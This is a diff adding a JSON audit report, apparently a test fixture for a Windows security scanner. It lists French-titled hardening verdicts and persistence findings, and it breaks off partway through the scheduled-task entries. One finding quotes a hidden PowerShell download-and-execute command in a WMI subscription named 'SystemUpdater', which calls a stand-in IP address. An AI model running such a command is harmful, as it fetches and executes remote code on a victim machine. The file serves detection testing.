@@ -1,0 +1,3969 @@
+{
+  "toolVersion": "test",
+  "startedAtUtc": "2026-01-01T00:00:00.0000000Z",
+  "collectors": [
+    {
+      "name": "inventory",
+      "status": "Ok",
+      "fields": {
+        "os.name": "Windows 11 Pro",
+        "os.displayVersion": "25H2",
+        "os.build": "26200",
+        "os.updateBuildRevision": "8875",
+        "os.edition": "Professional",
+        "os.installationType": "Client",
+        "os.version": "10.0.26200.0",
+        "os.is64Bit": "True",
+        "hardware.manufacturer": "Micro-Star International Co., Ltd.",
+        "hardware.model": "MS-7E80",
+        "hardware.family": "To be filled by O.E.M.",
+        "hardware.baseboardManufacturer": "Micro-Star International Co., Ltd.",
+        "hardware.baseboardProduct": "PRO B850-S WIFI6E (MS-7E80)",
+        "machine.processorCount": "16",
+        "firmware.type": "uefi",
+        "firmware.biosVersion": "2.A41",
+        "firmware.biosDate": "03/17/2026",
+        "security.secureBoot": "unsupported",
+        "security.tpmService": "absent",
+        "scan.elevated": "True",
+        "os.registryProductName": "Windows 10 Pro"
+      },
+      "diagnostics": []
+    }
+  ],
+  "verdicts": [
+    {
+      "ruleId": "WIN-ACC-001",
+      "title": "Aucune longueur minimale de mot de passe",
+      "severity": "High",
+      "domain": "accounts",
+      "status": "Fail",
+      "observed": "0",
+      "expected": "14"
+    },
+    {
+      "ruleId": "WIN-ACC-002",
+      "title": "Comptes actifs dispens\u00E9s de mot de passe",
+      "severity": "Critical",
+      "domain": "accounts",
+      "status": "Fail",
+      "observed": "1",
+      "expected": "0"
+    },
+    {
+      "ruleId": "WIN-ACC-003",
+      "title": "Compte invit\u00E9 actif",
+      "severity": "High",
+      "domain": "accounts",
+      "status": "Pass",
+      "observed": "false",
+      "expected": "false"
+    },
+    {
+      "ruleId": "WIN-ACC-004",
+      "title": "Trop d\u0027administrateurs locaux",
+      "severity": "Medium",
+      "domain": "accounts",
+      "status": "Pass",
+      "observed": "2",
+      "expected": "2"
+    },
+    {
+      "ruleId": "WIN-ACC-005",
+      "title": "Historique des mots de passe non conserv\u00E9",
+      "severity": "Medium",
+      "domain": "accounts",
+      "status": "Fail",
+      "observed": "0",
+      "expected": "24"
+    },
+    {
+      "ruleId": "WIN-ACC-006",
+      "title": "Verrouillage de compte non configur\u00E9",
+      "severity": "High",
+      "domain": "accounts",
+      "status": "Pass",
+      "observed": "10",
+      "expected": "0"
+    },
+    {
+      "ruleId": "WIN-ASR-001",
+      "title": "ASR \u2014 abus de pilotes sign\u00E9s vuln\u00E9rables non bloqu\u00E9",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-002",
+      "title": "ASR \u2014 vol d\u0027identifiants depuis LSASS non bloqu\u00E9",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-003",
+      "title": "ASR \u2014 persistance par abonnement WMI non bloqu\u00E9e",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-010",
+      "title": "ASR \u2014 cr\u00E9ation de processus enfants par Office non bloqu\u00E9e",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-011",
+      "title": "ASR \u2014 cr\u00E9ation de contenu ex\u00E9cutable par Office non bloqu\u00E9e",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-012",
+      "title": "ASR \u2014 injection de code par Office non bloqu\u00E9e",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-013",
+      "title": "ASR \u2014 appels d\u0027API Win32 depuis les macros Office non bloqu\u00E9s",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-014",
+      "title": "ASR \u2014 processus enfants d\u0027Outlook non bloqu\u00E9s",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-015",
+      "title": "ASR \u2014 processus enfants d\u0027Adobe Reader non bloqu\u00E9s",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-020",
+      "title": "ASR \u2014 contenu ex\u00E9cutable issu de la messagerie non bloqu\u00E9",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-021",
+      "title": "ASR \u2014 scripts potentiellement obfusqu\u00E9s non bloqu\u00E9s",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-022",
+      "title": "ASR \u2014 ex\u00E9cutables lanc\u00E9s par JavaScript ou VBScript non bloqu\u00E9s",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-023",
+      "title": "ASR \u2014 ex\u00E9cutables sans r\u00E9putation non bloqu\u00E9s",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-024",
+      "title": "ASR \u2014 processus issus de PsExec et WMI non bloqu\u00E9s",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-025",
+      "title": "ASR \u2014 ex\u00E9cution depuis un support USB non sign\u00E9 non bloqu\u00E9e",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-030",
+      "title": "ASR \u2014 red\u00E9marrage en mode sans \u00E9chec non bloqu\u00E9",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-031",
+      "title": "ASR \u2014 usage d\u0027outils syst\u00E8me copi\u00E9s ou usurp\u00E9s non bloqu\u00E9",
+      "severity": "Medium",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-ASR-032",
+      "title": "ASR \u2014 protection avanc\u00E9e contre les ran\u00E7ongiciels inactive",
+      "severity": "High",
+      "domain": "asr",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-CRED-001",
+      "title": "LSA Protection (RunAsPPL) d\u00E9sactiv\u00E9e",
+      "severity": "High",
+      "domain": "credentials",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-CRED-002",
+      "title": "WDigest conserve les mots de passe en clair en m\u00E9moire",
+      "severity": "Critical",
+      "domain": "credentials",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-CRED-003",
+      "title": "Nombre de connexions mises en cache trop \u00E9lev\u00E9",
+      "severity": "Medium",
+      "domain": "credentials",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 10)",
+      "expected": "4"
+    },
+    {
+      "ruleId": "WIN-DEF-001",
+      "title": "Defender d\u00E9sactiv\u00E9 par strat\u00E9gie",
+      "severity": "Critical",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-002",
+      "title": "Protection en temps r\u00E9el d\u00E9sactiv\u00E9e",
+      "severity": "Critical",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-003",
+      "title": "Analyse comportementale d\u00E9sactiv\u00E9e",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-004",
+      "title": "Analyse des scripts d\u00E9sactiv\u00E9e",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-005",
+      "title": "Analyse des fichiers t\u00E9l\u00E9charg\u00E9s d\u00E9sactiv\u00E9e",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-006",
+      "title": "Protection contre les applications ind\u00E9sirables (PUA) inactive",
+      "severity": "Medium",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-007",
+      "title": "Protection cloud (MAPS) d\u00E9sactiv\u00E9e",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 2)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-008",
+      "title": "Protection r\u00E9seau inactive",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-010",
+      "title": "Exclusions Defender d\u00E9finies par strat\u00E9gie",
+      "severity": "Medium",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "absent",
+      "expected": null
+    },
+    {
+      "ruleId": "WIN-DEF-011",
+      "title": "Smart App Control inactif",
+      "severity": "Medium",
+      "domain": "defender",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-DEF-009",
+      "title": "Protection contre les alterations inactive",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "true",
+      "expected": "true"
+    },
+    {
+      "ruleId": "WIN-DEF-012",
+      "title": "Protection en temps reel effectivement arretee",
+      "severity": "Critical",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "true",
+      "expected": "true"
+    },
+    {
+      "ruleId": "WIN-DEF-013",
+      "title": "Signatures antivirus trop anciennes",
+      "severity": "High",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "0",
+      "expected": "7"
+    },
+    {
+      "ruleId": "WIN-ENC-001",
+      "title": "Volume non protege par BitLocker",
+      "severity": "Critical",
+      "domain": "encryption",
+      "status": "Unknown",
+      "observed": null,
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-FW-001",
+      "title": "Pare-feu d\u00E9sactiv\u00E9 sur le profil Public",
+      "severity": "Critical",
+      "domain": "firewall",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-FW-002",
+      "title": "Pare-feu d\u00E9sactiv\u00E9 sur le profil Priv\u00E9",
+      "severity": "High",
+      "domain": "firewall",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-FW-003",
+      "title": "Pare-feu d\u00E9sactiv\u00E9 sur le profil Domaine",
+      "severity": "High",
+      "domain": "firewall",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-FW-004",
+      "title": "Connexions entrantes non bloqu\u00E9es par d\u00E9faut sur le profil Public",
+      "severity": "High",
+      "domain": "firewall",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-FW-005",
+      "title": "Notifications du pare-feu d\u00E9sactiv\u00E9es sur le profil Public",
+      "severity": "Low",
+      "domain": "firewall",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-FW-006",
+      "title": "R\u00E8gles de pare-feu locales fusionn\u00E9es malgr\u00E9 une strat\u00E9gie de domaine",
+      "severity": "Medium",
+      "domain": "firewall",
+      "status": "NotApplicable",
+      "observed": null,
+      "expected": null
+    },
+    {
+      "ruleId": "WIN-LEG-001",
+      "title": "SMBv1 activ\u00E9",
+      "severity": "Critical",
+      "domain": "legacy",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-LEG-002",
+      "title": "Signature SMB non exig\u00E9e c\u00F4t\u00E9 serveur",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-LEG-003",
+      "title": "LLMNR activ\u00E9",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "0"
+    },
+    {
+      "ruleId": "WIN-LEG-004",
+      "title": "PowerShell v2 encore install\u00E9",
+      "severity": "Medium",
+      "domain": "legacy",
+      "status": "Pass",
+      "observed": "absent",
+      "expected": null
+    },
+    {
+      "ruleId": "WIN-LOG-001",
+      "title": "Journalisation des blocs de script PowerShell inactive",
+      "severity": "High",
+      "domain": "logging",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-LOG-002",
+      "title": "Journalisation des modules PowerShell inactive",
+      "severity": "Medium",
+      "domain": "logging",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-LOG-003",
+      "title": "Ligne de commande absente des \u00E9v\u00E9nements de cr\u00E9ation de processus",
+      "severity": "High",
+      "domain": "logging",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-LOG-004",
+      "title": "Journal de s\u00E9curit\u00E9 trop petit",
+      "severity": "Medium",
+      "domain": "logging",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 20971520)",
+      "expected": "201326592"
+    },
+    {
+      "ruleId": "WIN-LOG-005",
+      "title": "Journal PowerShell op\u00E9rationnel trop petit",
+      "severity": "Low",
+      "domain": "logging",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 15728640)",
+      "expected": "104857600"
+    },
+    {
+      "ruleId": "WIN-LOG-006",
+      "title": "Transcription PowerShell inactive",
+      "severity": "Low",
+      "domain": "logging",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-NET-001",
+      "title": "NetBIOS sur TCP/IP non restreint",
+      "severity": "Medium",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "2"
+    },
+    {
+      "ruleId": "WIN-NET-002",
+      "title": "mDNS actif",
+      "severity": "Low",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "0"
+    },
+    {
+      "ruleId": "WIN-NET-003",
+      "title": "Signature SMB non exig\u00E9e c\u00F4t\u00E9 client",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-NET-004",
+      "title": "Envoi de mots de passe non chiffr\u00E9s \u00E0 des serveurs SMB tiers",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "0"
+    },
+    {
+      "ruleId": "WIN-NET-005",
+      "title": "Niveau d\u0027authentification LAN Manager trop permissif",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 3)",
+      "expected": "5"
+    },
+    {
+      "ruleId": "WIN-NET-006",
+      "title": "\u00C9num\u00E9ration anonyme des comptes et partages autoris\u00E9e",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-PRIV-001",
+      "title": "T\u00E9l\u00E9m\u00E9trie de diagnostic au niveau maximal",
+      "severity": "Medium",
+      "domain": "privacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 3)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-PRIV-002",
+      "title": "Identifiant de publicit\u00E9 actif",
+      "severity": "Low",
+      "domain": "privacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-PRIV-003",
+      "title": "Recall (analyse des captures d\u0027\u00E9cran) non d\u00E9sactiv\u00E9",
+      "severity": "Medium",
+      "domain": "privacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-PRIV-004",
+      "title": "Copilot Windows non d\u00E9sactiv\u00E9",
+      "severity": "Low",
+      "domain": "privacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-PRIV-005",
+      "title": "Contenu sugg\u00E9r\u00E9 et publicit\u00E9s dans l\u0027interface",
+      "severity": "Low",
+      "domain": "privacy",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-RDP-001",
+      "title": "Bureau \u00E0 distance activ\u00E9",
+      "severity": "Medium",
+      "domain": "remote-access",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 1)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-RDP-002",
+      "title": "Authentification au niveau du r\u00E9seau (NLA) non exig\u00E9e",
+      "severity": "High",
+      "domain": "remote-access",
+      "status": "NotApplicable",
+      "observed": null,
+      "expected": null
+    },
+    {
+      "ruleId": "WIN-BOOT-001",
+      "title": "Secure Boot d\u00E9sactiv\u00E9 ou indisponible",
+      "severity": "High",
+      "domain": "boot-integrity",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-BOOT-002",
+      "title": "Service TPM absent",
+      "severity": "Medium",
+      "domain": "boot-integrity",
+      "status": "Fail",
+      "observed": "absent",
+      "expected": null
+    },
+    {
+      "ruleId": "WIN-UPD-001",
+      "title": "Mises \u00E0 jour automatiques d\u00E9sactiv\u00E9es par strat\u00E9gie",
+      "severity": "Critical",
+      "domain": "updates",
+      "status": "Pass",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-SVC-001",
+      "title": "Service Windows Update arrete",
+      "severity": "Critical",
+      "domain": "updates",
+      "status": "Pass",
+      "observed": "manual",
+      "expected": "disabled"
+    },
+    {
+      "ruleId": "WIN-SVC-002",
+      "title": "Service du pare-feu Windows non demarre",
+      "severity": "Critical",
+      "domain": "firewall",
+      "status": "Pass",
+      "observed": "running",
+      "expected": "running"
+    },
+    {
+      "ruleId": "WIN-SVC-003",
+      "title": "Service Defender non demarre",
+      "severity": "Critical",
+      "domain": "defender",
+      "status": "Pass",
+      "observed": "running",
+      "expected": "running"
+    },
+    {
+      "ruleId": "WIN-SVC-010",
+      "title": "Service Telnet installe",
+      "severity": "High",
+      "domain": "legacy",
+      "status": "Pass",
+      "observed": "absent",
+      "expected": "absent"
+    },
+    {
+      "ruleId": "WIN-SVC-011",
+      "title": "Service de partage de connexion Internet actif",
+      "severity": "Medium",
+      "domain": "legacy",
+      "status": "Fail",
+      "observed": "running",
+      "expected": "running"
+    },
+    {
+      "ruleId": "WIN-SVC-012",
+      "title": "Service d\u0027assistance a distance (Remote Registry) actif",
+      "severity": "High",
+      "domain": "remote-access",
+      "status": "Pass",
+      "observed": "disabled",
+      "expected": "automatic"
+    },
+    {
+      "ruleId": "WIN-VBS-001",
+      "title": "Securite fondee sur la virtualisation inactive",
+      "severity": "High",
+      "domain": "virtualization",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-VBS-002",
+      "title": "Credential Guard inactif",
+      "severity": "High",
+      "domain": "virtualization",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    },
+    {
+      "ruleId": "WIN-VBS-003",
+      "title": "Integrite du code protegee par hyperviseur inactive",
+      "severity": "High",
+      "domain": "virtualization",
+      "status": "Fail",
+      "observed": "absent (d\u00E9faut Windows : 0)",
+      "expected": "1"
+    }
+  ],
+  "findings": [
+    {
+      "kind": "autorun",
+      "source": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
+      "target": "C:\\Windows\\System32\\SecurityHealthSystray.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "commande": "C:\\Windows\\System32\\SecurityHealthSystray.exe",
+        "signature": "Valid",
+        "\u00E9diteur": "CN=Microsoft Windows, O=Microsoft Corporation",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000001"
+      }
+    },
+    {
+      "kind": "autorun",
+      "source": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
+      "target": "C:\\Users\\anon:1a2b3c4d5e6f\\AppData\\Local\\Temp\\OneDriveSync.exe",
+      "severity": "Suspicious",
+      "reasons": [
+        "Binaire non sign\u00E9 : rien n\u0027atteste de son origine ni de son int\u00E9grit\u00E9.",
+        "Lanc\u00E9 depuis un emplacement inhabituel pour un programme install\u00E9."
+      ],
+      "details": {
+        "commande": "C:\\Users\\anon:1a2b3c4d5e6f\\AppData\\Local\\Temp\\OneDriveSync.exe",
+        "signature": "Unsigned",
+        "sha256": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef00000002"
+      }
+    },
+    {
+      "kind": "wmi-subscription",
+      "source": "CommandLineEventConsumer / SystemUpdater",
+      "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "severity": "Suspicious",
+      "reasons": [
+        "Ex\u00E9cute une ligne de commande \u00E0 chaque d\u00E9clenchement.",
+        "Persistance sans fichier : invisible des cl\u00E9s Run et des t\u00E2ches planifi\u00E9es."
+      ],
+      "details": {
+        "Name": "SystemUpdater",
+        "CommandLineTemplate": "powershell.exe -NoProfile -WindowStyle Hidden -Command \u0022IEX (New-Object Net.WebClient).DownloadString(\u0027http://198.51.100.23/u\u0027)\u0022",
+        "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "kind": "wmi-subscription",
+      "source": "__EventFilter / SCM Event Log Filter",
+      "target": "select * from MSFT_SCMEventLogEvent",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "requ\u00EAte": "select * from MSFT_SCMEventLogEvent"
+      }
+    },
+    {
+      "kind": "wmi-subscription",
+      "source": "__EventFilter / SystemUpdaterFilter",
+      "target": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0027Win32_PerfFormattedData_PerfOS_System\u0027",
+      "severity": "Notable",
+      "reasons": [
+        "Filtre d\u0027\u00E9v\u00E9nement enregistr\u00E9. Seul il n\u0027ex\u00E9cute rien ; associ\u00E9 \u00E0 un consommateur, il d\u00E9clenche du code."
+      ],
+      "details": {
+        "requ\u00EAte": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0027Win32_PerfFormattedData_PerfOS_System\u0027"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\AMDRyzenMasterSDKTask",
+      "target": "C:\\Program Files\\AMD\\CNext\\CNext\\cpumetricsserver.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "running",
+        "auteur": "Advanced Micro Devices",
+        "compte": "anon:9b7dfa1f0da9",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\Program Files\\AMD\\CNext\\CNext\\cpumetricsserver.exe",
+        "signature": "Valid",
+        "sha256": "02c45bb32a9c2d89a70a84ea7f24160d20c62ea1ab9276c7db03ca981d8e9644"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Launch Adobe CCXProcess",
+      "target": "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\CCXProcess.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:e4c93a1ab859",
+        "compte": "anon:9b7dfa1f0da9",
+        "commande": "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\CCXProcess.exe",
+        "signature": "Valid",
+        "sha256": "5a246f6dc531b0cbbb813a2755f192d9924181df9fe2ce6bfbe0375b436a3666"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-A80AA35AC5B8}",
+      "target": "C:\\Program Files\\NVIDIA Corporation\\NVIDIA App\\CEF\\NVIDIA App.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "NVIDIA Corporation",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\Program Files\\NVIDIA Corporation\\NVIDIA App\\CEF\\NVIDIA App.exe",
+        "signature": "Valid",
+        "sha256": "cc73be352589f3e76ba126c2dcaf57b7518dffc92a0d1e1bf9e2f7e72b75d87e"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\StartCN",
+      "target": "C:\\Program Files\\AMD\\CNext\\CNext\\cncmd.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Advanced Micro Devices",
+        "commande": "C:\\Program Files\\AMD\\CNext\\CNext\\cncmd.exe startwithdelay",
+        "signature": "Valid",
+        "sha256": "7cd4cba3e2ecbb623a7116dfc79480bb1cf9389817106fe7fd58153601b3a886"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\StartDVR",
+      "target": "C:\\Program Files\\AMD\\CNext\\CNext\\RSServCmd.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Advanced Micro Devices",
+        "commande": "C:\\Program Files\\AMD\\CNext\\CNext\\RSServCmd.exe",
+        "signature": "Valid",
+        "sha256": "7a9ab19e381949b100f0594d969304ea3a31bbc5dba879bbd55be7142c0f4900"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Office\\Office Automatic Updates 2.0",
+      "target": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft Office",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe /frequentupdate SCHEDULEDTASK displaylevel=False",
+        "signature": "Valid",
+        "sha256": "cc60165e11ed0dec47f9b493129dd85f60f84b2a56b344ee98693ff17ca40092"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Office\\Office ClickToRun Service Monitor",
+      "target": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft Office",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe /WatchService",
+        "signature": "Valid",
+        "sha256": "cc60165e11ed0dec47f9b493129dd85f60f84b2a56b344ee98693ff17ca40092"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Office\\Office Feature Updates",
+      "target": "C:\\Program Files\\Microsoft Office\\root\\Office16\\sdxhelper.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft Office",
